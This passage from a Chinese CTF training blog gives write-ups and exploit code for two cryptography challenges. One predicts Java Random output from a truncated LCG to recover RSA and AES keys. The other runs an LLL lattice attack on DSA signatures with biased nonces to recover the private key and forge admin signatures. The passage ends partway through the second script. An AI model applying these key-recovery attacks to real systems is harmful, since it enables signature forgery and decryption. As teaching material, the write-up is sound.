AES</span></span><br><span class="line">SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> SecretKeySpec(arrayOfByte1, <span class="string">"AES"</span>);</span><br><span class="line">Cipher localCipher = Cipher.getInstance(<span class="string">"AES/CBC/NoPadding"</span>);</span><br><span class="line"><span class="comment">// AES encrypt part</span></span><br></pre></td></tr></table></figure><p><strong>加密链</strong></p><p><code>oldtest</code>先调用了20次java的<code>nextInt()</code></p><p><code>this.seed</code>经过$GF(2^{256})$下的平方运算后生成<code>state</code></p><p><code>state</code>通过RSA part生成的24组$(p,q),e=17$，加密得到<code>this.states</code> (len(states == 24))</p><p><code>lrandout</code>先AES/CBC完整加密了一次<code>this.states</code>的24个值，<strong>但该次并未更新<code>this.states</code></strong></p><p>由于<code>this.stateselse</code>此时为0，因此执行<code>lrandout</code>会先新生成24个state（即调用<code>gen_new_states</code>）</p><p>在旧states后新增一长度为24的states后，用新增的states加密得到的结果即为new.txt中内容</p><p><strong>攻击思路</strong></p><p><img src= "/img/loading.gif" data-src="/2020/08/12/CTF-Training-Record-2/Snipaste_2020-08-17_16-13-09.png" alt></p><p>a, b, m均已知，且hidden length仅为16bits的Truncated LCG，直接爆破PRNG_seed的hidden部分即可</p><p>得到PRNG_seed后，加密源码后续中所有生成的随机数均可预测</p><p>而用到随机数生成的有$p,q$生成及$AES_Encryption$中的genKey</p><p>加密部分最后的两次<code>lrandout</code>，再加上其中间的<code>gen_new_states</code>，共调用了三次<code>encrypt</code>（72次AES/CBC的Genkey）</p><p>因此所有过程可控，恢复即可</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><p><code>SeedAttack.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SeedAttack</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> a = <span class="number">0x5deece66dL</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> b = <span class="number">11L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> m = <span class="number">0xffffffffffffL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">crack_seed</span><span class="params">(<span class="keyword">long</span> d1, <span class="keyword">long</span> d2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xffff</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">long</span> seed = (d1 &lt;&lt; <span class="number">16</span>) + i;</span><br><span class="line">            <span class="keyword">long</span> guess_d2 = (a * seed + b &amp; m) &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">            <span class="keyword">if</span> (guess_d2 == d2) &#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] PRNG's seed: "</span> + String.valueOf(seed));</span><br><span class="line">                <span class="keyword">return</span> seed;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"[!] PRNG crack failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public static void main(String[] args) &#123;</span></span><br><span class="line"><span class="comment">//        SeedAttack localSeedAttack = new SeedAttack();</span></span><br><span class="line"><span class="comment">//        long d1 = -1029728314L;</span></span><br><span class="line"><span class="comment">//        long d2 = 1487023297L;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            long seed = localSeedAttack.crack_seed(d1, d2);</span></span><br><span class="line"><span class="comment">//            System.out.println(seed);</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(e.getMessage());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CMA.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CMA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CMA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> PRNG_seed = <span class="number">0L</span>;</span><br><span class="line">        SeedAttack localSeedAttack = <span class="keyword">new</span> SeedAttack();</span><br><span class="line">        <span class="keyword">long</span> d1 = -<span class="number">1029728314L</span>;</span><br><span class="line">        <span class="keyword">long</span> d2 = <span class="number">1487023297L</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PRNG_seed = localSeedAttack.crack_seed(d1, d2);</span><br><span class="line"><span class="comment">//            System.out.println(PRNG_seed);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.random.setSeed(PRNG_seed ^ <span class="number">0x5DEECE66DL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// discard trash which generate old.txt</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discardTrash</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">19</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="keyword">this</span>.random.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">genRSA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        BigInteger e = BigInteger.valueOf(<span class="number">17L</span>);</span><br><span class="line">        ArrayList&lt;ArrayList&gt; RSA_params = <span class="keyword">new</span> ArrayList&lt;ArrayList&gt;(<span class="number">24</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">            ArrayList curRSAparams = <span class="keyword">new</span> ArrayList(<span class="number">2</span>);</span><br><span class="line">            BigInteger p = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random);</span><br><span class="line">            BigInteger q = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random);</span><br><span class="line">            curRSAparams.add(p);</span><br><span class="line">            curRSAparams.add(q);</span><br><span class="line">            RSA_params.add(curRSAparams);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"prikey"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">                ArrayList curRSAparams = RSA_params.get(i);</span><br><span class="line">                String p = curRSAparams.get(<span class="number">0</span>).toString();</span><br><span class="line">                String q = curRSAparams.get(<span class="number">1</span>).toString();</span><br><span class="line">                localPrintWriter.println(<span class="string">"("</span> + p + <span class="string">", "</span> + q + <span class="string">")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"[+] RSA's priKey found"</span>);</span><br><span class="line">            localPrintWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException error) &#123;</span><br><span class="line">            error.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer localStringBuffer = <span class="keyword">new</span> StringBuffer(paramArrayOfByte.length * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; paramArrayOfByte.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((paramArrayOfByte[i] &amp; <span class="number">0xFF</span>) &lt; <span class="number">16</span>) localStringBuffer.append(<span class="string">"0"</span>);</span><br><span class="line">            localStringBuffer.append(Long.toString(paramArrayOfByte[i] &amp; <span class="number">0xFF</span>, <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> localStringBuffer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">genKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"AESkey"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] key = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">                <span class="keyword">this</span>.random.nextBytes(key);</span><br><span class="line">                localPrintWriter.println(byte2hex(key));</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"[+] AES's key found"</span>);</span><br><span class="line">            localPrintWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CMA exp = <span class="keyword">new</span> CMA();</span><br><span class="line">        exp.discardTrash();</span><br><span class="line">        exp.genRSA();</span><br><span class="line">        exp.genKey();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">()</span>:</span></span><br><span class="line">    pqs = []</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'prikey'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fRSA:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fRSA:</span><br><span class="line">            pq = re.findall(<span class="string">r"\((.*), (.*)\)"</span>, line)[<span class="number">0</span>]</span><br><span class="line">            pqs.append((int(pq[<span class="number">0</span>]), int(pq[<span class="number">1</span>])))</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'AESkey'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fAES:</span><br><span class="line">        key = [unhexlify(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> fAES]</span><br><span class="line">        key = [key[:<span class="number">24</span>], key[<span class="number">24</span>:<span class="number">48</span>], key[<span class="number">48</span>:]]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'new.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fCIPHER:</span><br><span class="line">        cipher = [unhexlify(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> fCIPHER]</span><br><span class="line">    <span class="keyword">return</span> pqs, key, cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec1</span><span class="params">(p, q, c, key1, key2)</span>:</span></span><br><span class="line">    aes2 = AES.new(key2, AES.MODE_CBC, iv=<span class="string">b"\x00"</span>*<span class="number">16</span>)</span><br><span class="line">    c = aes2.decrypt(c)</span><br><span class="line">    aes1 = AES.new(key1, AES.MODE_CBC, iv=<span class="string">b"\x00"</span>*<span class="number">16</span>)</span><br><span class="line">    c = bytes_to_long(aes1.decrypt(c))</span><br><span class="line">    e = <span class="number">17</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    m = pow(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(x)</span>:</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin(x)[<span class="number">2</span>:]:</span><br><span class="line">        a = a &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (int(i)):</span><br><span class="line">            a = a ^ x</span><br><span class="line">        <span class="keyword">if</span> a &gt;&gt; <span class="number">256</span>:</span><br><span class="line">            a = a ^ <span class="number">0x10000000000000000000000000000000000000000000000000000000000000223</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = mul(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"flag"</span> <span class="keyword">in</span> long_to_bytes(m):</span><br><span class="line">            print(long_to_bytes(m))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pqs, key, cipher = getData()</span><br><span class="line">    m = dec1(pqs[<span class="number">0</span>][<span class="number">0</span>], pqs[<span class="number">0</span>][<span class="number">1</span>], cipher[<span class="number">0</span>], key[<span class="number">1</span>][<span class="number">0</span>], key[<span class="number">2</span>][<span class="number">0</span>])</span><br><span class="line">    dec2(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'flag&#123;86824087489918371343860652&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="GxzyCTF2020-HNP"><a href="#GxzyCTF2020-HNP" class="headerlink" title="[GxzyCTF2020 - HNP]"></a>[GxzyCTF2020 - HNP]</h3><h4 id="题目考点-1"><a href="#题目考点-1" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>Hidden Number Problem</li></ul><h4 id="题目文件-1"><a href="#题目文件-1" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="HNP.zip">Click Here to Download</a></p><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>$q\rightarrow 128bits,\quad p\rightarrow 1024bits,\quad q\mid (p-1)$</p><p>$g=2^{\frac{p-1}{q}}mod\ p,\quad x\rightarrow priKey,\quad y=g^{x}mod\ p\rightarrow pubKey$</p><p><strong>签名: </strong>$r=(g^{k}mod\ p)mod\ q,\quad s=k^{-1}(H(m)+xr)mod\ q$</p><p>变形可得：$s^{-1}(H(m)+xr)\equiv k(mod\ q)$</p><p>假设k存在上界K，则有$|s^{-1}H(m)+(s^{-1}r)x|&lt;K(mod\ q)$</p><p>令$A=s^{-1}H(m),\quad B=s^{-1}r$，可建立如下格基：</p><script type="math/tex; mode=display">\left[\begin{matrix}q & ... & ... & 0 & 0 & 0\\0 & q & ... & 0 & 0 & 0\\... & ... & ... & ... & ... & ...\\0 & 0 & ... & q & 0 & 0\\B_{1} & B_{2} & ... & B_{n} & a & 0\\A_{1} & A_{2} & ... & A_{n} & 0 & b\end{matrix}\right]</script><p>下对参数$a,b$取值进行估计$(K=2^{121},n=35)$：</p><p>需令$[k_{1},k_{2},…,k_{n},ax,b]$为SVP目标向量</p><p>$2^{\frac{n+1}{4}}(q^{n}ab)^{\frac{1}{n+2}}&gt;\sqrt{nK^{2}+(ax)^{2}+b^{2}}$</p><p>$2^{18}2^{128\cdot \frac{70}{37}}(ab)^{\frac{2}{37}}&gt;35\cdot 2^{242}+2^{256}a^{2}+b^{2}$</p><p>放缩为$2^{260}(ab)^{\frac{2}{37}}&gt;2^{251}+2^{256}a^{2}+b^{2}$</p><p>显然在$ab=1$时，令$a=\frac{1}{2^{64}},b=2^{64}$，即明显满足上述不等式（$2^{128}a=b$）</p><p>本地作测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># genKey for DSA</span></span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = getRandomNBitInteger(<span class="number">1024</span> - <span class="number">128</span> - <span class="number">1</span>)</span><br><span class="line">    p = (t * <span class="number">2</span>*q + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">e = (p - <span class="number">1</span>) // q</span><br><span class="line">g = pow(<span class="number">2</span>, e, p)</span><br><span class="line">x = getRandomRange(<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">y = int(pow(g, x, p))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(Hm)</span>:</span></span><br><span class="line">    k = getRandomRange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">121</span>)</span><br><span class="line">    r = int(pow(g, k, p)) % q</span><br><span class="line">    s = (inverse(k, q) * (Hm + x * r)) % q</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_x</span><span class="params">()</span>:</span></span><br><span class="line">    M_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">        M_list.append([q * int(i == j) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">37</span>)])</span><br><span class="line">    Hm = int.from_bytes(sha256(<span class="string">b"0xDktb"</span>).digest(), <span class="string">'big'</span>)</span><br><span class="line">    As = []</span><br><span class="line">    Bs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">        r, s = sign(Hm)</span><br><span class="line">        A = (inverse(s, q) * Hm) % q</span><br><span class="line">        B = (inverse(s, q) * r) % q</span><br><span class="line">        As.append(A)</span><br><span class="line">        Bs.append(B)</span><br><span class="line">    Bs = Bs + [<span class="number">1</span>/(<span class="number">2</span>**<span class="number">64</span>), <span class="number">0</span>]</span><br><span class="line">    As = As + [<span class="number">0</span>, <span class="number">2</span>**<span class="number">64</span>]</span><br><span class="line">    M_list.append(Bs)</span><br><span class="line">    M_list.append(As)</span><br><span class="line">    M = Matrix(QQ, M_list)</span><br><span class="line">    ML = M.LLL()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ML:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">-1</span>] == (<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">            prikey = (line[<span class="number">-2</span>] * (<span class="number">2</span>**<span class="number">64</span>)) % q</span><br><span class="line">            print(<span class="string">"[+] SVP's solution found! prikey = &#123;&#125;"</span>.format(prikey))</span><br><span class="line">            <span class="keyword">return</span> prikey</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> x != crack_x():</span><br><span class="line">        print(<span class="string">"Failed"</span>)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/08/12/CTF-Training-Record-2/Snipaste_2020-08-18_17-07-26.png" alt></p><p>在$K=2^{121},n=35$时，测试成功率可视作100%，但令$K=2^{122}$时，虽然界仍满足，但是成功率有亿点点低（迷惑行为</p><p>因此远程获取$k_bits&lt;122$的35组签名数据，即可破解私钥x，本地生成admin的签名，实现越权</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number 